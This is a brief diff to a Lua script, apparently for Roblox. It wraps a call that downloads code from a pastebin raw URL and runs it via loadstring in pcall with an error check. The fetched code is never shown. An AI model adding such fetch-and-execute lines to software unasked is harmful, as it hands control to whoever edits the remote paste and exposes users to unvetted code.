@@ -1,4 +1,11 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/dcZL5YNK"))()
+pcall(function()
+    local source = game:HttpGet("https://pastebin.com/raw/dcZL5YNK")
+    local remoteScript = loadstring(source)
+
+    if remoteScript then
+        remoteScript()
+    end
+end)
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
